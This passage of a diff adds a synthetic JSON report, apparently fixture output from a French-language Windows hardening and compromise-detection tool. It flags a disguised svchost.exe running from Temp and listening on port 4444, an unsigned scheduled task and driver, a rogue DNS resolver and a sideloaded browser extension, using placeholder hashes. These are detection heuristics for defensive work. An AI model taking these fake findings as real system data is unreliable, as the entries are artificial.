+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\System32\\dsregcmd.exe /checkrecovery",
+        "signature": "Valid",
+        "sha256": "ac3346176cb1a5dc50c0e9c98f3204718eedff97409adc92dcdb99be652ca113"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WwanSvc\\NotificationTask",
+      "target": "C:\\WINDOWS\\System32\\WiFiTask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:082aa9f5d7b9",
+        "commande": "C:\\WINDOWS\\System32\\WiFiTask.exe wwan",
+        "signature": "Valid",
+        "sha256": "828985c661c1120521b210504fa5c6953717a0f841cdb9bce4507c3cde94e4f6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WwanSvc\\OobeDiscovery",
+      "target": "OobeDiscovery",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\XblGameSave\\XblGameSaveTask",
+      "target": "C:\\WINDOWS\\System32\\XblGameSaveTask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\System32\\XblGameSaveTask.exe standby",
+        "signature": "Valid",
+        "sha256": "d021acaeebd5b9857fa2f261aff52586c9974a176b98f446183307accd96110d"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\SoftLanding\\anon:cca6beabe766\\SoftLandingCreativeManagementTask",
+      "target": "SoftLandingCreativeManagementTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "anon:cca6beabe766",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\SoftLanding\\anon:9b7dfa1f0da9\\SoftLandingCreativeManagementTask",
+      "target": "SoftLandingCreativeManagementTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "anon:9b7dfa1f0da9",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\SoftLanding\\anon:9b7dfa1f0da9\\SoftLandingDeferralTask-{31a32128-532a-482b-a9fa-cc36ec49bbbc}",
+      "target": "SoftLandingDeferralTask-{31a32128-532a-482b-a9fa-cc36ec49bbbc}",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "anon:9b7dfa1f0da9",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\SoftLanding\\anon:9b7dfa1f0da9\\SoftLandingTriggerTask-128000000001615609-render-{94c88dba-72d8-48a9-9134-ed8ed835dd5d}",
+      "target": "SoftLandingTriggerTask-128000000001615609-render-{94c88dba-72d8-48a9-9134-ed8ed835dd5d}",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "anon:9b7dfa1f0da9",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\SoftLanding\\anon:9ec9fa350c22\\SoftLandingCreativeManagementTask",
+      "target": "SoftLandingCreativeManagementTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "anon:9ec9fa350c22",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\SoftLanding\\anon:fe2a3f975474\\SoftLandingCreativeManagementTask",
+      "target": "SoftLandingCreativeManagementTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "anon:fe2a3f975474",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Maintenance\\SystemMaintenance",
+      "target": "C:\\ProgramData\\SystemMaintenance\\svcupdate.exe",
+      "severity": "Suspicious",
+      "reasons": [
+        "Binaire non sign\u00E9 : rien n\u0027atteste de son origine ni de son int\u00E9grit\u00E9."
+      ],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft Corporation",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\ProgramData\\SystemMaintenance\\svcupdate.exe /silent",
+        "signature": "Unsigned",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000007"
+      }
+    },
+    {
+      "kind": "driver",
+      "source": "Ntfs",
+      "target": "C:\\Windows\\System32\\drivers\\ntfs.sys",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "chemin": "C:\\Windows\\System32\\drivers\\ntfs.sys",
+        "signature": "Valid",
+        "\u00E9diteur": "CN=Microsoft Windows, O=Microsoft Corporation",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000003"
+      }
+    },
+    {
+      "kind": "driver",
+      "source": "syndrv64",
+      "target": "C:\\Windows\\System32\\drivers\\syndrv64.sys",
+      "severity": "Suspicious",
+      "reasons": [
+        "Binaire non sign\u00E9 : rien n\u0027atteste de son origine ni de son int\u00E9grit\u00E9."
+      ],
+      "details": {
+        "chemin": "C:\\Windows\\System32\\drivers\\syndrv64.sys",
+        "signature": "Unsigned",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000004"
+      }
+    },
+    {
+      "kind": "process",
+      "source": "svchost.exe",
+      "target": "C:\\Windows\\System32\\svchost.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "instances": "1",
+        "pid": "1180",
+        "parent": "892",
+        "signature": "Valid",
+        "\u00E9diteur": "CN=Microsoft Windows, O=Microsoft Corporation",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000005"
+      }
+    },
+    {
+      "kind": "process",
+      "source": "svchost.exe",
+      "target": "C:\\Users\\anon:1a2b3c4d5e6f\\AppData\\Local\\Temp\\svchost.exe",
+      "severity": "Suspicious",
+      "reasons": [
+        "Binaire non sign\u00E9 : rien n\u0027atteste de son origine ni de son int\u00E9grit\u00E9.",
+        "Lanc\u00E9 depuis un emplacement inhabituel pour un programme install\u00E9."
+      ],
+      "details": {
+        "instances": "1",
+        "pid": "4712",
+        "parent": "6104",
+        "signature": "Unsigned",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000006"
+      }
+    },
+    {
+      "kind": "logon-extension",
+      "source": "Winlogon\\Userinit",
+      "target": "C:\\WINDOWS\\system32\\userinit.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "r\u00E9f\u00E9rence": "C:\\WINDOWS\\system32\\userinit.exe",
+        "signature": "Valid",
+        "sha256": "6557bb7316e1bfd6fcab7a91459bb8c47c61e112ce20d806931f7cbfe0ab83aa"
+      }
+    },
+    {
+      "kind": "logon-extension",
+      "source": "Winlogon\\Shell",
+      "target": "C:\\Windows\\explorer.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "r\u00E9f\u00E9rence": "explorer.exe",
+        "signature": "Valid",
+        "sha256": "80b21e6f70524efd84037a4eda479ddc4bc55c0d6c1a33439b85a554e740f30c"
+      }
+    },
+    {
+      "kind": "lsa-package",
+      "source": "Lsa\\Authentication Packages",
+      "target": "C:\\Windows\\System32\\msv1_0.dll",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "paquet": "msv1_0",
+        "liste": "Authentication Packages",
+        "signature": "Valid",
+        "sha256": "288a2061dd52eaf8f5febdd2d931858a3f20198119bcfeadaa3df48ad7af3336"
+      }
+    },
+    {
+      "kind": "lsa-package",
+      "source": "Lsa\\Notification Packages",
+      "target": "C:\\Windows\\System32\\scecli.dll",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "paquet": "scecli",
+        "liste": "Notification Packages",
+        "signature": "Valid",
+        "sha256": "e434527aa58a9e0c071c3ea0c04b7fb5fc9d53f2117e24fb3cbb566169c1930b"
+      }
+    },
+    {
+      "kind": "listening-port",
+      "source": "TCP 0.0.0.0:4444",
+      "target": "C:\\Users\\anon:1a2b3c4d5e6f\\AppData\\Local\\Temp\\svchost.exe",
+      "severity": "Suspicious",
+      "reasons": [
+        "Joignable depuis un r\u00E9seau public (\u00E9coute sur toutes les interfaces, autoris\u00E9 par le pare-feu) et tenu par un binaire non attest\u00E9.",
+        "Binaire non sign\u00E9 : rien n\u0027atteste de son origine ni de son int\u00E9grit\u00E9.",
+        "Lanc\u00E9 depuis un emplacement inhabituel pour un programme install\u00E9."
+      ],
+      "details": {
+        "protocole": "TCP",
+        "adresse": "0.0.0.0",
+        "port": "4444",
+        "exposition": "toutes les interfaces",
+        "pid": "4712",
+        "signature": "Unsigned",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000006",
+        "pare-feu": "autoris\u00E9 en entr\u00E9e (Public)"
+      }
+    },
+    {
+      "kind": "listening-port",
+      "source": "TCP 0.0.0.0:5555",
+      "target": "C:\\Users\\anon:1a2b3c4d5e6f\\AppData\\Local\\Temp\\svchost.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "protocole": "TCP",
+        "adresse": "0.0.0.0",
+        "port": "5555",
+        "exposition": "toutes les interfaces",
+        "pid": "4712",
+        "signature": "Unsigned",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000006",
+        "pare-feu": "bloqu\u00E9 en entr\u00E9e (Public)"
+      }
+    },
+    {
+      "kind": "listening-port",
+      "source": "TCP 127.0.0.1:49669",
+      "target": "PID 8321",
+      "severity": "Benign",
+      "reasons": [
+        "\u00C9coute locale uniquement \u2014 hors de port\u00E9e du r\u00E9seau."
+      ],
+      "details": {
+        "protocole": "TCP",
+        "adresse": "127.0.0.1",
+        "port": "49669",
+        "exposition": "locale",
+        "pid": "8321",
+        "\u00E9ph\u00E9m\u00E8re": "Port de la plage dynamique : le syst\u00E8me en attribue un autre \u00E0 chaque ouverture. Son num\u00E9ro n\u0027identifie rien de stable."
+      }
+    },
+    {
+      "kind": "dns-resolver",
+      "source": "Ethernet",
+      "target": "198.51.100.23",
+      "severity": "Notable",
+      "reasons": [
+        "R\u00E9solveur DNS statique non reconnu (198.51.100.23) \u2014 un serveur pos\u00E9 par-dessus celui du r\u00E9seau est le levier d\u0027un d\u00E9tournement DNS."
+      ],
+      "details": {
+        "origine": "statique",
+        "r\u00E9solveurs": "198.51.100.23"
+      }
+    },
+    {
+      "kind": "dns-resolver",
+      "source": "Wi-Fi",
+      "target": "192.0.2.1",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "origine": "DHCP",
+        "r\u00E9solveurs": "192.0.2.1"
+      }
+    },
+    {
+      "kind": "browser-extension",
+      "source": "Chrome/anon:7c1e05b4a930",
+      "target": "Secure Browsing Helper",
+      "severity": "Suspicious",
+      "reasons": [
+        "Install\u00E9e hors du magasin d\u0027extensions (sideload) \u2014 le vecteur classique d\u0027extension malveillante."
+      ],
+      "details": {
+        "navigateur": "Chrome",
+        "profil": "anon:7c1e05b4a930",
+        "id": "hjklmnopqrstuvwxabcdefghijklmnop",
+        "version": "1.4.2",
+        "permissions": "tabs, cookies, webRequest, nativeMessaging",
+        "acc\u00E8s": "\u003Call_urls\u003E",
+        "\u00E9tat": "activ\u00E9e",
+        "magasin": "non"
+      }
+    },
+    {
+      "kind": "browser-extension",
+      "source": "Chrome/anon:7c1e05b4a930",
+      "target": "Password Vault",
+      "severity": "Notable",
+      "reasons": [
+        "Acc\u00E8s \u00E0 toutes les pages web : peut lire et modifier tout ce qui s\u0027affiche.",
+        "Permission sensible : nativeMessaging."
+      ],
+      "details": {
+        "navigateur": "Chrome",
+        "profil": "anon:7c1e05b4a930",
+        "id": "abcdefghijklmnopqrstuvwxyzabcdef",
+        "version": "3.11.0",
+        "permissions": "storage, nativeMessaging",
+        "acc\u00E8s": "\u003Call_urls\u003E",
+        "\u00E9tat": "activ\u00E9e",
+        "magasin": "oui"
+      }
+    }
+  ],
+  "score": {
+    "overall": 52,
+    "domains": [
+      {
+        "domain": "accounts",
+        "passed": 3,
+        "failed": 3,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 40
+      },
+      {
+        "domain": "asr",
+        "passed": 0,
+        "failed": 18,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 0
+      },
+      {
+        "domain": "boot-integrity",
+        "passed": 0,
+        "failed": 2,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 0
+      },
+      {
+        "domain": "credentials",
+        "passed": 1,
+        "failed": 2,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 60
+      },
+      {
+        "domain": "defender",
+        "passed": 12,
+        "failed": 2,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 92
+      },
+      {
+        "domain": "encryption",
+        "passed": 0,
+        "failed": 0,
+        "unknown": 1,
+        "notApplicable": 0,
+        "score": null
+      },
+      {
+        "domain": "firewall",
+        "passed": 6,
+        "failed": 0,
+        "unknown": 0,
+        "notApplicable": 1,
+        "score": 100
+      },
+      {
+        "domain": "legacy",
+        "passed": 4,
+        "failed": 8,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 43
+      },
+      {
+        "domain": "logging",
+        "passed": 0,
+        "failed": 6,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 0
+      },
+      {
+        "domain": "privacy",
+        "passed": 0,
+        "failed": 5,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 0
+      },
+      {
+        "domain": "remote-access",
+        "passed": 2,
+        "failed": 0,
+        "unknown": 0,
+        "notApplicable": 1,
+        "score": 100
+      },
+      {
+        "domain": "updates",
+        "passed": 2,
+        "failed": 0,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 100
+      },
+      {
+        "domain": "virtualization",
+        "passed": 0,
+        "failed": 3,
+        "unknown": 0,
+        "notApplicable": 0,
+        "score": 0
+      }
+    ],
+    "totalUnknown": 1,
+    "isPartial": true
+  },
+  "rulesFingerprint": "82:c3e6e3029b12",
+  "dataAge": {
+    "asOfUtc": "2026-07-21T00:00:00Z",
+    "days": 0,
+    "stale": false,
+    "unknown": false,
+    "thresholdDays": 180
+  },
+  "dnsProbe": null,
+  "updateNote": null,
+  "integrityNote": null,
+  "rulesNote": null
+}
